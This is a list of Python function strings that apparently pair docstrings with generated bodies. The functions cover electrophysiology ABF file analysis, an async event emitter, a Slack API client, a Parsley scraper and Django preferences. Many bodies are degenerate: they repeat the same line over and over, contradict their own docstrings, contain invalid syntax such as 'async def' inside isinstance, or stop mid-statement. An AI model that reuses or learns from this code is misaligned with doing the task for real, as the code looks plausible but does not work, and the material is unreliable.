        "def analyze_all(self):\n        \"\"\"analyze every unanalyzed ABF in the folder.\"\"\"\n        for root, dirs, files in os.walk(self.folder):\n            for f in files:\n                if f.endswith('.abf'):\n                    self.analyze_file(os.path.join(root, f))",
        "def html_from_file(self, filename):\n        \"\"\"return appropriate HTML determined by file extension.\"\"\"\n        if filename.endswith('.html'):\n            return filename\n        elif filename.endswith('.htm'):\n            return filename\n        else:\n            raise ValueError('unknown file extension: %s' % filename)",
        "def generate_parent_flat_file(self, parent_id, child_id=None):\n        \"\"\"\n        generate a generic flat file html for an ABF parent. You could give\n        this a single ABF ID, its parent ID, or a list of ABF IDs.\n        If a child ABF is given, the parent will automatically be used.\n        \"\"\"\n        if child_id:\n            child_id = child_id.split('/')[-1]\n        else:\n            child_id = parent_id\n        if child_id:\n            child_id = child_id.split('/')[-1]\n        if child_id:\n            child_id = child_id.split('/')[-1]\n        if child_id:\n            child_id = child_id.split('/')[-1]\n        if child_id:",
        "def create_id_plot(self):\n        \"\"\"create ID_plot.html of just intrinsic properties.\"\"\"\n        plot_id = self.plot_id\n        plot_id = plot_id.replace('_', '-')\n        plot_id = plot_id.replace('.', '-')\n        plot_id = plot_id.replace('-', '_')\n        plot_id = plot_id.replace('.', '_')\n        plot_id = plot_id.replace('-', '_')\n        plot_id = plot_id.replace('.', '_')\n        plot_id = plot_id.replace('-', '_')\n        plot_id = plot_id.replace('.', '_')\n        plot_id = plot_id.replace('-', '_')\n        plot_id = plot_id.replace('.', '_')\n        plot_",
        "def kernel_convolution(signal, kernel, kernel_size=3, kernel_type='same'):\n    \"\"\"\n    This applies a kernel to a signal through convolution and returns the result.\n\n    Some magic is done at the edges so the result doesn't apprach zero:\n        1. extend the signal's edges with len(kernel)/2 duplicated values\n        2. perform the convolution ('same' mode)\n        3. slice-off the ends we added\n        4. return the same number of points as the original\n    \"\"\"\n    if kernel_type == 'same':\n        kernel = np.array(kernel)\n        kernel_size = kernel.shape[0]\n        kernel_type = 'same'\n    if kernel_type == 'same':\n        kernel = np.array(kernel)\n        kernel_size = kernel.shape[0]\n        kernel_type = '",
        "def timer(self, name, start=None, end=None, interval=None):\n        \"\"\" simple timer. returns a time object, or a string. \"\"\"\n        if start is None:\n            start = time.time()\n        if end is None:\n            end = start + interval\n        return self.timer_func(name, start, end)",
        "def pop(self, value):\n        \"\"\"if the value is in the list, move it to the front and return it.\"\"\"\n        if value in self:\n            self.list.insert(0, value)\n            return value\n        else:\n            raise ValueError(\"Value %r not in list\" % value)",
        "def pop(self, value):\n        \"\"\"if the value is in the list, move it to the back and return it.\"\"\"\n        if value in self:\n            self.index -= 1\n            if self.index < 0:\n                self.index = len(self) - 1\n            return self[self.index]\n        else:\n            raise ValueError(\"Value %r not in list\" % value)",
        "def first_items(first_items, second_items):\n    \"\"\"\n    given a list and a list of items to be first, return the list in the\n    same order except that it begins with each of the first items.\n    \"\"\"\n    return [item for item in first_items if item not in second_items]",
        "def sort_goofy_abfs(goofy_abfs):\n    \"\"\"\n    given a list of goofy ABF names, return it sorted intelligently.\n    This places things like 16o01001 after 16901001.\n    \"\"\"\n    goofy_abfs = sorted(goofy_abfs, key=lambda x: x.goofy_id)\n    return goofy_abfs",
        "def get_files_by_ids(files):\n    \"\"\"\n    when given a dictionary where every key contains a list of IDs, replace\n    the keys with the list of files matching those IDs. This is how you get a\n    list of files belonging to each child for each parent.\n    \"\"\"\n    files_by_id = {}\n    for key, value in files.items():\n        if isinstance(value, list):\n            files_by_id[key] = value\n    return files_by_id",
        "def get_parent_id(groups, id):\n    \"\"\"given a groups dictionary and an ID, return its actual parent ID.\"\"\"\n    for group in groups:\n        if group['id'] == id:\n            return group['parent_id']\n    return None",
        "def get_tmp_user_dir():\n    \"\"\"return the semi-temporary user folder\"\"\"\n    tmp_user_dir = os.path.join(os.path.expanduser('~'), '.tmp')\n    if not os.path.exists(tmp_user_dir):\n        os.makedirs(tmp_user_dir)\n    return tmp_user_dir",
        "def _catch_error(emitter, event, listener, coro):\n    \"\"\"Coroutine wrapper to catch errors after async scheduling.\n\n    Args:\n        emitter (EventEmitter): The event emitter that is attempting to\n            call a listener.\n        event (str): The event that triggered the emitter.\n        listener (async def): The async def that was used to generate the coro.\n        coro (coroutine): The coroutine that should be tried.\n\n    If an exception is caught the function will use the emitter to emit the\n    failure event. If, however, the current event _is_ the failure event then\n    the method reraises. The reraised exception may show in debug mode for the\n    event loop but is otherwise silently dropped.\n    \"\"\"\n    try:\n        yield coro\n    except Exception as e:\n        if not emitter.is_set(event):\n            emitter.emit",
        "def _check_limit(self):\n        \"\"\"Check if the listener limit is hit and warn if needed.\"\"\"\n        if self.limit is not None and self.limit > 0 and self.listeners:\n            if len(self.listeners) > self.limit:\n                self.logger.warning(\n                    \"Too many listeners: %s\",\n                    self.listeners,\n                )",
        "def on(self, event, listener):\n        \"\"\"Bind a listener to a particular event.\n\n        Args:\n            event (str): The name of the event to listen for. This may be any\n                string value.\n            listener (def or async def): The callback to execute when the event\n                fires. This may be a sync or async function.\n        \"\"\"\n        if not isinstance(event, basestring):\n            raise TypeError(\"event must be a string\")\n        if not isinstance(listener, (asyncio.AsyncFunction, asyncio.AsyncGeneratorFunction)):\n            raise TypeError(\"listener must be a function or generator function\")\n        self._listeners[event].append(listener)",
        "def add_once(self, listener):\n        \"\"\"Add a listener that is only called once.\"\"\"\n        if listener not in self._listeners:\n            self._listeners.append(listener)",
        "def remove_listener(self, event, listener):\n        \"\"\"Remove a listener from the emitter.\n\n        Args:\n            event (str): The event name on which the listener is bound.\n            listener: A reference to the same object given to add_listener.\n\n        Returns:\n            bool: True if a listener was removed else False.\n\n        This method only removes one listener at a time. If a listener is\n        attached multiple times then this method must be called repeatedly.\n        Additionally, this method removes listeners first from the those\n        registered with 'on' or 'add_listener'. If none are found it continue\n        to remove afterwards from those added with 'once'.\n        \"\"\"\n        if event not in self._listeners:\n            return False\n\n        if listener is self._listeners[event]:\n            del self._listeners[event]\n            return True\n\n        if listener.once",
        "def schedule(self, event, listener, *args, **kwargs):\n        \"\"\"Schedule a coroutine for execution.\n\n        Args:\n            event (str): The name of the event that triggered this call.\n            listener (async def): The async def that needs to be executed.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        The values of *args and **kwargs are passed, unaltered, to the async\n        def when generating the coro. If there is an exception generating the\n        coro, such as the wrong number of arguments, the emitter's error event\n        is triggered. If the triggering event _is_ the emitter's error event\n        then the exception is reraised. The reraised exception may show in\n        debug mode for the event loop but is otherwise silently dropped.\n        \"\"\"\n        if not self._debug:\n           ",
        "def execute(self, event, listener, *args, **kwargs):\n        \"\"\"Execute a sync function.\n\n        Args:\n            event (str): The name of the event that triggered this call.\n            listener (def): The def that needs to be executed.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        The values of *args and **kwargs are passed, unaltered, to the def\n        when exceuting. If there is an exception executing the def, such as the\n        wrong number of arguments, the emitter's error event is triggered. If\n        the triggering event _is_ the emitter's error event then the exception\n        is reraised. The reraised exception may show in debug mode for the\n        event loop but is otherwise silently dropped.\n        \"\"\"\n        if not self.is_running:\n            raise RuntimeError",
        "def dispatch(self, event, listener, *args, **kwargs):\n        \"\"\"Dispatch an event to a listener.\n\n        Args:\n            event (str): The name of the event that triggered this call.\n            listener (def or async def): The listener to trigger.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        This method inspects the listener. If it is a def it dispatches the\n        listener to a method that will execute that def. If it is an async def\n        it dispatches it to a method that will schedule the resulting coro with\n        the event loop.\n        \"\"\"\n        if isinstance(listener, (async def, async def)):\n            coro = listener(*args, **kwargs)\n            self._loop.add_future(coro, event, listener)\n        else:\n            self._loop.add_",
        "def trigger(self, event, *args, **kwargs):\n        \"\"\"Call each listener for the event with the given arguments.\n\n        Args:\n            event (str): The event to trigger listeners on.\n            *args: Any number of positional arguments.\n            **kwargs: Any number of keyword arguments.\n\n        This method passes all arguments other than the event name directly\n        to the listeners. If a listener raises an exception for any reason the\n        'listener-error', or current value of LISTENER_ERROR_EVENT, is emitted.\n        Listeners to this event are given the event name, listener object, and\n        the exception raised. If an error listener fails it does so silently.\n\n        All event listeners are fired in a deferred way so this method returns\n        immediately. The calling coro must yield at some point for the event\n        to propagate to the listeners.\n        \"\"\"\n        if event not",
        "def get_listener_count(self, event):\n        \"\"\"Get the number of listeners for the event.\n\n        Args:\n            event (str): The event for which to count all listeners.\n\n        The resulting count is a combination of listeners added using\n        'on'/'add_listener' and 'once'.\n        \"\"\"\n        return sum(len(l) for l in self.listeners if l.event == event)",
        "def convert_tifs_to_pngs(self):\n        \"\"\"Convert each TIF to PNG. Return filenames of new PNGs.\"\"\"\n        for tif in self.tifs:\n            tif_path = os.path.join(self.output_dir, tif)\n            if not os.path.exists(tif_path):\n                continue\n            if not os.path.isdir(tif_path):\n                os.makedirs(tif_path)\n            png_path = os.path.join(tif_path, 'png')\n            self.logger.info('Converting TIF %s to PNG', tif)\n            self.convert_tif_to_png(tif, png_path)\n            return png_path",
        "def generate_static_html(self, id, files):\n        \"\"\"\n        given an ID and the dict of files, generate a static html for that abf.\n        \"\"\"\n        html = self.render_template(\n            'static_html.html',\n            id=id,\n            files=files,\n        )\n        return html",
        "def _parse_folder(self, folder):\n        \"\"\"expects a folder of ABFs.\"\"\"\n        for root, dirs, files in os.walk(folder):\n            for f in files:\n                if f.endswith('.abf'):\n                    self._parse_abf(root + '/' + f)",
        "def plot_sweep(self):\n        \"\"\"\n        simple example how to load an ABF file and plot every sweep.\n        \"\"\"\n        # load the file\n        abf = self.load_file()\n\n        # plot the sweep\n        for i in range(len(abf)):\n            print(abf[i].sweep)\n\n        # plot the sweep\n        plt.show()",
        "def plot_data(self, data, **kwargs):\n        \"\"\"\n        plot X and Y data, then shade its background by variance.\n        \"\"\"\n        if self.plot_data_only:\n            return\n        if self.plot_data_only_plot:\n            return\n        if self.plot_data_only_plot_plot:\n            return\n        if self.plot_data_only_plot_plot_plot:\n            return\n        if self.plot_data_only_plot_plot_plot_plot:\n            return\n        if self.plot_data_only_plot_plot_plot_plot:\n            return\n        if self.plot_data_only_plot_plot_plot_plot:\n            return\n        if self.plot_data_only_plot_plot_plot_plot:\n            return\n        if self.plot_data",
        "def create_color_graphs(self):\n        \"\"\"create some fancy graphs to show color-coded variances.\"\"\"\n        self.color_graphs = []\n        for i in range(len(self.color_graphs)):\n            self.color_graphs.append(\n                self.color_graph_class(self.color_graphs[i], self.color_graphs[i].color_map))",
        "def run(self):\n        \"\"\"\n        run this before analysis. Checks if event detection occured.\n        If not, runs AP detection on all sweeps.\n        \"\"\"\n        if self.sweep_info is None:\n            self.sweep_info = self.get_sweep_info()\n        if self.sweep_info is None:\n            self.sweep_info = self.get_sweep_info_from_file()\n        if self.sweep_info is None:\n            self.sweep_info = self.get_sweep_info_from_file_with_ap_detection()\n        if self.sweep_info is None:\n            self.sweep_info = self.get_sweep_info_from_file_with_ap_detection_with_event_detection()\n        if self.sweep_info is None",
        "def run(self):\n        \"\"\"\n        runs AP detection on every sweep.\n        \"\"\"\n        self.sweep_start_time = time.time()\n        self.sweep_count = 0\n        self.sweep_total_time = time.time()\n        self.sweep_total_time_s = self.sweep_total_time / self.sweep_count\n        self.sweep_total_time_ms = self.sweep_total_time_s * 1000\n        self.sweep_total_time_s = round(self.sweep_total_time_s, 2)\n        self.sweep_total_time_ms = round(self.sweep_total_time_ms, 2)\n        self.sweep_total_time_s = round(self.sweep_total_time_s, 2)\n",
        "def get_package_info():\n    \"\"\"Return package author and version as listed in `init.py`.\"\"\"\n    with open(os.path.join(os.path.dirname(__file__), 'init.py')) as f:\n        for line in f:\n            if line.startswith('__version__'):\n                return line.split('=')[1].strip()",
        "def create_api_subclass(name, docstring, remove_methods, base=SlackApi):\n    \"\"\"Create an API subclass with fewer methods than its base class.\n\n    Arguments:\n      name (:py:class:`str`): The name of the new class.\n      docstring (:py:class:`str`): The docstring for the new class.\n      remove_methods (:py:class:`dict`): The methods to remove from\n        the base class's :py:attr:`API_METHODS` for the subclass. The\n        key is the name of the root method (e.g. ``'auth'`` for\n        ``'auth.test'``, the value is either a tuple of child method\n        names (e.g. ``('test',)``) or, if all children should be\n        removed, the special value :py:const:`ALL`.\n      base (:py:class",
        "def _execute_api(self, method, **params):\n        \"\"\"Execute a specified Slack Web API method.\n\n        Arguments:\n          method (:py:class:`str`): The name of the method.\n          **params (:py:class:`dict`): Any additional parameters\n            required.\n\n        Returns:\n          :py:class:`dict`: The JSON data from the response.\n\n        Raises:\n          :py:class:`aiohttp.web_exceptions.HTTPException`: If the HTTP\n            request returns a code other than 200 (OK).\n          SlackApiError: If the Slack API is reached but the response\n           contains an error message.\n        \"\"\"\n        response = self._session.request(\n            method,\n            **params\n        )\n        response_json = response.json()\n        if response_json.get('error'):\n            raise Slack",
        "def has_method(self, method):\n        \"\"\"Whether a given method exists in the known API.\n\n        Arguments:\n          method (:py:class:`str`): The name of the method.\n\n        Returns:\n          :py:class:`bool`: Whether the method is in the known API.\n        \"\"\"\n        return method in self._methods or method in self._methods_with_defaults",
        "def xpath_extension(self, xpath, namespace):\n        \"\"\"Extend XPath evaluation with Parsley extensions' namespace\"\"\"\n        if not self.is_ready:\n            self.load()\n        return self.xpath(xpath, namespace)",
        "def _try_to_convert_to_strings(self, element):\n        \"\"\"Try and convert matching Elements to unicode strings.\n\n        If this fails, the selector evaluation probably already\n        returned some string(s) of some sort, or boolean value,\n        or int/float, so return that instead.\n        \"\"\"\n        if isinstance(element, (Element, ElementSelector)):\n            return element.text\n        elif isinstance(element, (int, float)):\n            return str(element)\n        elif isinstance(element, (bool, str)):\n            return element.lower()\n        else:\n            return element",
        "def join(self, filters=None):\n        \"\"\"Join the real-time messaging service.\n\n        Arguments:\n          filters (:py:class:`dict`, optional): Dictionary mapping\n            message filters to the functions they should dispatch to.\n            Use a :py:class:`collections.OrderedDict` if precedence is\n            important; only one filter, the first match, will be\n            applied to each message.\n        \"\"\"\n        if filters is None:\n            filters = collections.OrderedDict()\n        self._join(filters)",
        "def _handle_message(self, message, filters):\n        \"\"\"Handle an incoming message appropriately.\n\n        Arguments:\n          message (:py:class:`aiohttp.websocket.Message`): The incoming\n            message to handle.\n          filters (:py:class:`list`): The filters to apply to incoming\n            messages.\n        \"\"\"\n        if message.type == Message.TEXT:\n            self._handle_text_message(message, filters)\n        elif message.type == Message.BINARY:\n            self._handle_binary_message(message, filters)\n        elif message.type == Message.CLOSE:\n            self._handle_close_message(message, filters)\n        else:\n            raise ValueError(\"Unexpected message type: %s\" % message.type)",
        "def send_message(self, message, **kwargs):\n        \"\"\"If you send a message directly to me\"\"\"\n        if self.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is_bot:\n            return\n        if self.bot.is",
        "def from_api_token(cls, token=None, api_cls=SlackBotApi):\n        \"\"\"Create a new instance from the API token.\n\n        Arguments:\n          token (:py:class:`str`, optional): The bot's API token\n            (defaults to ``None``, which means looking in the\n            environment).\n          api_cls (:py:class:`type`, optional): The class to create\n            as the ``api`` argument for API access (defaults to\n            :py:class:`aslack.slack_api.SlackBotApi`).\n\n        Returns:\n          :py:class:`SlackBot`: The new instance.\n        \"\"\"\n        return cls(\n            api=api_cls,\n            token=token,\n            client=None,\n            **cls._api_token_kwargs\n        )",
        "def format_message(self, channel, text):\n        \"\"\"Format an outgoing message for transmission.\n\n        Note:\n          Adds the message type (``'message'``) and incremental ID.\n\n        Arguments:\n          channel (:py:class:`str`): The channel to send to.\n          text (:py:class:`str`): The message text to send.\n\n        Returns:\n          :py:class:`str`: The JSON string of the message.\n        \"\"\"\n        return self.format_message_type(\n            'message', self.incremental_id, channel, text\n        )",
        "def socket_url(self):\n        \"\"\"Get the WebSocket URL for the RTM session.\n\n        Warning:\n          The URL expires if the session is not joined within 30\n          seconds of the API call to the start endpoint.\n\n        Returns:\n          :py:class:`str`: The socket URL.\n        \"\"\"\n        if self.session_id is None:\n            return None\n        return self._client.get_url(\n            self.session_id,\n            'ws://{}:{}'.format(self.host, self.ws_port),\n        )",
        "def generate_instructions(self, filters):\n        \"\"\"Generates the instructions for a bot and its filters.\n\n        Note:\n          The guidance for each filter is generated by combining the\n          docstrings of the predicate filter and resulting dispatch\n          function with a single space between. The class's\n          :py:attr:`INSTRUCTIONS` and the default help command are\n          added.\n\n        Arguments:\n          filters (:py:class:`list`): The filters to apply to incoming\n            messages.\n\n        Returns:\n          :py:class:`str`: The bot's instructions.\n        \"\"\"\n        instructions = self.INSTRUCTIONS\n        for filter in filters:\n            instructions = instructions.format(\n                filter=filter.doc,\n                help=self.help_command)\n        return instructions",
        "def send(self, channel, text):\n        \"\"\"Respond to a message on the current socket.\n\n        Args:\n          channel (:py:class:`str`): The channel to send to.\n          text (:py:class:`str`): The message text to send.\n        \"\"\"\n        self.socket.send(channel + text)",
        "def _check_handshake(self, msg):\n        \"\"\"Check the first message matches the expected handshake.\n\n        Note:\n          The handshake is provided as :py:attr:`RTM_HANDSHAKE`.\n\n        Arguments:\n          msg (:py:class:`aiohttp.Message`): The message to validate.\n\n        Raises:\n          :py:class:`SlackApiError`: If the data doesn't match the\n            expected handshake.\n        \"\"\"\n        if not self.RTM_HANDSHAKE:\n            raise SlackApiError('No handshake provided')\n\n        if not self.RTM_HANDSHAKE.get('id'):\n            raise SlackApiError('No id provided')\n\n        if not self.RTM_HANDSHAKE.get('secret'):\n            raise SlackApiError('No secret provided')\n\n        if not self.RTM",
        "def get_tested_apps(self):\n        \"\"\"Returns list of paths to tested apps\"\"\"\n        return [\n            os.path.join(self.app_path, app)\n            for app in self.app_paths\n            if os.path.isdir(os.path.join(self.app_path, app))\n        ]",
        "def get_task_classes(self):\n        \"\"\"Get the imported task classes for each task that will be run\"\"\"\n        task_classes = []\n        for task in self.tasks:\n            task_classes.append(task.task_class)\n        return task_classes",
        "def get_options(self):\n        \"\"\"Get the options for each task that will be run\"\"\"\n        options = {}\n        for task in self.tasks:\n            options.update(task.get_options())\n        return options",
        "def write_metadata(self, dest, mdname):\n        \"\"\"\n        Write the data from the db to a CLDF dataset according to the metadata in `self.dataset`.\n\n        :param dest:\n        :param mdname:\n        :return: path of the metadata file\n        \"\"\"\n        if self.dataset is None:\n            return\n        if self.dataset.metadata is None:\n            return\n        if self.dataset.metadata.get('file_format') == 'hdf5':\n            return self.write_hdf5_metadata(dest, mdname)\n        elif self.dataset.metadata.get('file_format') == 'hdf5_file':\n            return self.write_hdf5_file_metadata(dest, mdname)\n        elif self.dataset.metadata.get('file_format') == 'hdf5_array':\n            return self.write_",
        "def description(self):\n        \"\"\"A user-friendly description of the handler.\n\n        Returns:\n          :py:class:`str`: The handler's description.\n        \"\"\"\n        if self._description is None:\n            self._description = self.__class__.__name__\n        return self._description",
        "def from_jsonfile(cls, fp, **kwargs):\n        \"\"\"\n        Create a Parselet instance from a file containing\n        the Parsley script as a JSON object\n\n        >>> import parslepy\n        >>> with open('parselet.json') as fp:\n        ...     parslepy.Parselet.from_jsonfile(fp)\n        ...\n        <parslepy.base.Parselet object at 0x2014e50>\n\n        :param file fp: an open file-like pointer containing the Parsley script\n        :rtype: :class:`.Parselet`\n\n        Other arguments: same as for :class:`.Parselet` contructor\n        \"\"\"\n        return cls(fp, **kwargs)",
        "def from_yamlfile(cls, fp, **kwargs):\n        \"\"\"\n        Create a Parselet instance from a file containing\n        the Parsley script as a YAML object\n\n        >>> import parslepy\n        >>> with open('parselet.yml') as fp:\n        ...     parslepy.Parselet.from_yamlfile(fp)\n        ...\n        <parslepy.base.Parselet object at 0x2014e50>\n\n        :param file fp: an open file-like pointer containing the Parsley script\n        :rtype: :class:`.Parselet`\n\n        Other arguments: same as for :class:`.Parselet` contructor\n        \"\"\"\n        parser = yaml.Parser(**kwargs)\n        return cls(parser.parse(fp))",
        "def parse_lines(self, lines):\n        \"\"\"\n        Interpret input lines as a JSON Parsley script.\n        Python-style comment lines are skipped.\n        \"\"\"\n        lines = [line.strip() for line in lines]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n        lines = [line for line in lines if line]\n       ",
        "def _build_parselet_tree(self, parselet_node, level):\n        \"\"\"Build part of the abstract Parsley extraction tree\n\n        Arguments:\n        parselet_node (dict) -- part of the Parsley tree to compile\n                                (can be the root dict/node)\n        level (int)          -- current recursion depth (used for debug)\n        \"\"\"\n        if level == 0:\n            self.parselet_tree = parselet_node\n        else:\n            self.parselet_tree = self._build_parselet_tree(\n                parselet_node.get('children', []), level + 1)",
        "def _create_foreign_key_constraints(self, component):\n        \"\"\"\n        Use CLDF reference properties to implicitely create foreign key constraints.\n\n        :param component: A Table object or `None`.\n        \"\"\"\n        if component is None:\n            return\n\n        for column in component.columns:\n            if column.is_foreign_key:\n                self._create_foreign_key_constraint(column)",
        "def _create_url(self, endpoint, root=None, params=None, url_params=None):\n        \"\"\"Create a URL for the specified endpoint.\n\n        Arguments:\n          endpoint (:py:class:`str`): The API endpoint to access.\n          root: (:py:class:`str`, optional): The root URL for the\n            service API.\n          params: (:py:class:`dict`, optional): The values for format\n            into the created URL (defaults to ``None``).\n          url_params: (:py:class:`dict`, optional): Parameters to add\n            to the end of the URL (defaults to ``None``).\n\n        Returns:\n          :py:class:`str`: The resulting URL.\n        \"\"\"\n        if params is None:\n            params = {}\n        if url_params is None:\n            url_params = {}\n        if root is",
        "def _RaiseError(self, response):\n    \"\"\"Raise an appropriate error for a given response.\n\n    Arguments:\n      response (:py:class:`aiohttp.ClientResponse`): The API response.\n\n    Raises:\n      :py:class:`aiohttp.web_exceptions.HTTPException`: The appropriate\n        error for the response's status.\n    \"\"\"\n    status = response.status\n    if status == 200:\n      return\n    if status == 404:\n      raise errors.NotFoundError(response.headers)\n    if status == 429:\n      raise errors.TooManyRequests(response.headers)\n    if status == 500:\n      raise errors.ServerError(response.headers)\n    raise errors.HTTPException(status, response.content)",
        "def truncate(text, max_len=350, end='...'):\n    \"\"\"Truncate the supplied text for display.\n\n    Arguments:\n      text (:py:class:`str`): The text to truncate.\n      max_len (:py:class:`int`, optional): The maximum length of the\n        text before truncation (defaults to 350 characters).\n      end (:py:class:`str`, optional): The ending to use to show that\n        the text was truncated (defaults to ``'...'``).\n\n    Returns:\n      :py:class:`str`: The truncated text.\n    \"\"\"\n    if max_len < 350:\n        max_len = 350\n    return text[:max_len - len(end)] + end",
        "def add_source(self, ref_id=None, bib_record=None):\n        \"\"\"Add a source, either specified by glottolog reference id, or as bibtex record.\"\"\"\n        if ref_id is None:\n            ref_id = self.reference_id\n        if bib_record is None:\n            bib_record = self.bib_record\n        self.sources.append(Source(ref_id, bib_record))",
        "def _get_cache_key(self, username, image_size):\n        \"\"\"Returns a cache key consisten of a username and image size.\"\"\"\n        return self.username_cache_key % (username, image_size)",
        "def cache_size(func):\n    \"\"\"\n    Decorator to cache the result of functions that take a ``user`` and a\n    ``size`` value.\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        user = kwargs.pop('user', None)\n        size = kwargs.pop('size', None)\n        if user is None or size is None:\n            return func(*args, **kwargs)\n        return _cache_size(user, size, func)\n    return wrapper",
        "def _avatar_changed(self, user, avatar):\n        \"\"\"Function to be called when saving or changing an user's avatars.\"\"\"\n        if avatar:\n            self.avatar = avatar\n            self.avatar_changed_signal.emit(user)",
        "def get_field_for_pref_proxy(pref_proxy):\n    \"\"\"\n    Returns a field object instance for a given PrefProxy object.\n\n    :param PrefProxy pref_proxy:\n\n    :rtype: models.Field\n    \"\"\"\n    if pref_proxy.field_name:\n        return getattr(models, pref_proxy.field_name)\n    else:\n        return None",
        "def update_field_from_pref_proxy(field_obj, pref_proxy):\n    \"\"\"\n    Updates field object with data from a PrefProxy object.\n\n    :param models.Field field_obj:\n\n    :param PrefProxy pref_proxy:\n    \"\"\"\n    field_obj.name = pref_proxy.name\n    field_obj.help_text = pref_proxy.help_text\n    field_obj.help_text_html = pref_proxy.help_text_html\n    field_obj.help_text_plain = pref_proxy.help_text_plain\n    field_obj.help_text_html_plain = pref_proxy.help_text_html_plain\n    field_obj.help_text_plain_html = pref_proxy.help_text_plain_html\n    field_obj.help_text_html = pref_proxy",
        "def get_preferences_model_class(app_label, model_name):\n    \"\"\"Returns preferences model class dynamically crated for a given app or None on conflict.\"\"\"\n    try:\n        return apps.get_model(app_label, model_name)\n    except LookupError:\n        return None",
        "def get_frame_locals(frame, stepback=None):\n    \"\"\"\n    Returns locals dictionary from a given frame.\n\n    :param int stepback:\n\n    :rtype: dict\n    \"\"\"\n    if stepback is None:\n        stepback = 0\n\n    frame_locals = {}\n\n    for name in frame.f_locals:\n        frame_locals[name] = frame.f_locals[name]\n\n    return frame_locals",
        "def _walk_frame_locals(frame, stepback=0):\n    \"\"\"\n    Generator to walk through variables considered as preferences\n    in locals dict of a given frame.\n\n    :param int stepback:\n\n    :rtype: tuple\n    \"\"\"\n    for key in frame.f_locals:\n        if key.startswith('_'):\n            continue\n        if key.startswith('_' + 'PREFERENCES_'):\n            continue\n        if key.startswith('_' + 'PREFERENCES_' + 'PREFERENCES_'):\n            continue\n        if key.startswith('_' + 'PREFERENCES_' + 'PREFERENCES_' + 'PREFERENCES_'):\n            continue\n        if key.startswith('_' + 'PREFERENCES_' + 'PREFERENCES_' + 'PREFERENCES_'):\n            continue\n        if key.startswith('_' +",
        "def print_file_details(self, filename):\n        \"\"\"Prints file details in the current directory\"\"\"\n        if filename:\n            print(\"File: %s\" % filename)\n            print(\"Size: %s\" % self.get_file_size(filename))\n            print(\"Type: %s\" % self.get_file_type(filename))\n            print(\"Type: %s\" % self.get_file_type(filename))\n            print(\"Type: %s\" % self.get_file_type(filename))\n            print(\"Type: %s\" % self.get_file_type(filename))\n            print(\"Type: %s\" % self.get_file_type(filename))\n            print(\"Type: %s\" % self.get_file_type(filename))\n            print(\"Type: %s\" % self.get_file_type(filename",
        "def _bind_args(self, args):\n        \"\"\"\n        Attempt to bind the args to the type signature. First try to just bind\n        to the signature, then ensure that all arguments match the parameter\n        types.\n        \"\"\"\n        if not self.is_bound:\n            self.bind()\n        if not self.is_bound:\n            return args\n        if not all(isinstance(arg, self.parameter_type) for arg in args):\n            raise TypeError(\"Argument types do not match\")\n        return args",
        "def _create_matcher(self, param_name):\n        \"\"\"\n        For every parameter, create a matcher if the parameter has an\n        annotation.\n        \"\"\"\n        if param_name in self.annotations:\n            matcher = self.annotations[param_name]\n            if matcher is not None:\n                return matcher\n        matcher = self._create_matcher(param_name)\n        self.annotations[param_name] = matcher\n        return matcher",
        "def dispatch_wrapper(self, func):\n        \"\"\"\n        Makes a wrapper function that executes a dispatch call for func. The\n        wrapper has the dispatch and dispatch_first attributes, so that\n        additional overloads can be added to the group.\n        \"\"\"\n        def wrapper(*args, **kwargs):\n            self.dispatch(func, *args, **kwargs)\n            return self.dispatch_first\n        return wrapper",
        "def add(self, func):\n        \"\"\"Adds the decorated function to this dispatch.\"\"\"\n        if not callable(func):\n            raise TypeError(\"func must be callable\")\n        self._funcs.append(func)",
        "def front(self, func):\n        \"\"\"\n        Adds the decorated function to this dispatch, at the FRONT of the order.\n        Useful for allowing third parties to add overloaded functionality\n        to be executed before default functionality.\n        \"\"\"\n        self._front.append(func)\n        return func",
        "def dispatch(self, *args):\n        \"\"\"Dispatch a call. Call the first function whose type signature matches\n        the arguemts.\"\"\"\n        if len(args) == 0:\n            raise ValueError(\"no arguments to dispatch\")\n        if len(args) > 1:\n            raise ValueError(\"too many arguments to dispatch\")\n        if len(args) == 1:\n            return args[0]\n        if len(args) == 2:\n            return self.dispatch(args[0], args[1])\n        if len(args) == 3:\n            return self.dispatch(args[0], args[1], args[2])\n        raise ValueError(\"invalid arguments to dispatch\")",
        "def _reproject(self, l):\n        \"\"\"reprojette en WGS84 et recupere l'extend\"\"\"\n        # reprojette en WGS84\n        proj = self.proj\n        lon, lat = proj.lat_lon\n        lon_min = lon - self.lon_min\n        lat_min = lat - self.lat_min\n        lon_max = lon + self.lon_max\n        lat_max = lat + self.lat_max\n        l_min = l - self.l_min\n        l_max = l + self.l_max\n        l_min_ = l_min - self.l_min\n        l_max_ = l_max + self.l_max\n        l_min_ = l_min - self.l_min\n        l_max_ = l_max + self.l_max\n",
        "def grib_to_tif(grib_file, output_file):\n    \"\"\"Convert GRIB to Tif\"\"\"\n    with open(grib_file, 'rb') as f:\n        grib = f.read()\n    grib = grib.decode('utf-8')\n    grib = grib.split('\\n')\n    grib = [line.strip() for line in grib]\n    grib = [line for line in grib if line]\n    grib = [line for line in grib if line.startswith('TIF')]\n    grib = [line for line in grib if line.startswith('TIF')]\n    grib = [line for line in grib if line.startswith('TIF')]\n    grib = [line for line in grib if line.startswith('TIF')",
        "def on_dynamic_preferences_model_save(sender, instance, **kwargs):\n    \"\"\"Triggered on dynamic preferences model save.\n     Issues DB save and reread.\n    \"\"\"\n    if instance.id:\n        instance.save()\n        instance.reload()",
